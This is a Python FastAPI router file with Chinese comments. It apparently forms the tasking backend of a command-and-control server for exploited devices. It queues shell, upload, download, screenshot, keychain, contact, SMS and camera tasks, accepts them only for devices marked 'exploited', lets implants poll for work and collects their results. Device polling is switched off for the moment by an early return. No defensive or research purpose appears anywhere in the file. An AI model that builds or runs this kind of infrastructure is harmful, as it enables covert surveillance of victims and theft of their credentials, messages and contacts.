"""任务管理 API 路由"""

from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from typing import List

from database import get_db
import crud, schemas
from models import Task

router = APIRouter(prefix="/api/tasks", tags=["tasks"])


@router.post("/create", response_model=schemas.TaskOut)
def create_task(task: schemas.TaskCreate, db: Session = Depends(get_db)):
    """
    创建单个任务
    支持的任务类型：shell, upload, download, screenshot, keychain, contact, sms, camera, etc.
    """
    # 检查设备是否存在
    device = crud.get_device(db, task.device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    # 检查设备状态 - 只有已利用(exploited)或在线(online)的设备才能接收任务
    if device.status not in ('exploited', 'online'):
        raise HTTPException(status_code=400, detail=f"设备状态为 '{device.status}'，无法接收任务。请等待设备完成漏洞利用后再试。")
    
    return crud.create_task(db, task)


@router.post("/create/batch", response_model=List[schemas.TaskOut])
def create_batch_tasks(batch: schemas.TaskBatchCreate, db: Session = Depends(get_db)):
    """
    批量创建任务
    支持同时向多个设备下发相同任务
    """
    # 检查所有设备是否存在且状态有效
    invalid_devices = []
    for device_uuid in batch.device_uuids:
        device = crud.get_device(db, device_uuid)
        if not device:
            raise HTTPException(status_code=404, detail=f"Device {device_uuid} not found")
        if device.status not in ('exploited', 'online'):
            invalid_devices.append(f"{device_uuid} ({device.status})")
    
    if invalid_devices:
        raise HTTPException(status_code=400, detail=f"以下设备状态无效，无法接收任务: {', '.join(invalid_devices)}")
    
    return crud.create_batch_tasks(db, batch)


@router.get("/poll/{device_uuid}", response_model=List[schemas.TaskOut])
def poll_tasks(device_uuid: str, db: Session = Depends(get_db)):
    """
    设备轮询待执行任务
    当前关闭：不返回任何任务，避免假任务链干扰 bootstrap
    """
    # 强制关闭任务下发
    return []
    # 检查设备是否存在
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    tasks = crud.get_pending_tasks(db, device_uuid)
    
    # 将任务状态更新为running
    for task in tasks:
        crud.update_task_status(db, task.id, "running")
    
    return tasks


@router.post("/result")
def submit_task_result(result: schemas.TaskResult, db: Session = Depends(get_db)):
    """
    设备提交任务执行结果
    更新任务状态和结果
    """
    task = crud.update_task_status(
        db, 
        result.task_id, 
        result.status, 
        result=result.result, 
        error_message=result.error_message
    )
    
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")
    
    return {"ok": True, "task_id": result.task_id, "status": result.status}


@router.get("/device/{device_uuid}", response_model=List[schemas.TaskOut])
def get_device_tasks(device_uuid: str, skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    """获取指定设备的任务列表"""
    # 检查设备是否存在
    device = crud.get_device(db, device_uuid)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    return crud.get_device_tasks(db, device_uuid, skip=skip, limit=limit)


@router.get("/{task_id}", response_model=schemas.TaskOut)
def get_task(task_id: int, db: Session = Depends(get_db)):
    """获取单个任务详情"""
    task = crud.get_task(db, task_id)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")
    return task


@router.delete("/{task_id}")
def cancel_task(task_id: int, db: Session = Depends(get_db)):
    """取消任务"""
    task = crud.update_task_status(db, task_id, "cancelled")
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")
    return {"ok": True, "message": "Task cancelled"}


@router.get("", response_model=List[schemas.TaskOut])
def list_tasks(skip: int = 0, limit: int = 100, status: str = None, db: Session = Depends(get_db)):
    """
    获取所有任务列表
    支持按状态筛选
    """
    from sqlalchemy import desc
    if status:
        tasks = db.query(Task).filter(
            Task.status == status
        ).order_by(desc(Task.created_at)).offset(skip).limit(limit).all()
        return tasks
    
    return db.query(Task).order_by(desc(Task.created_at)).offset(skip).limit(limit).all()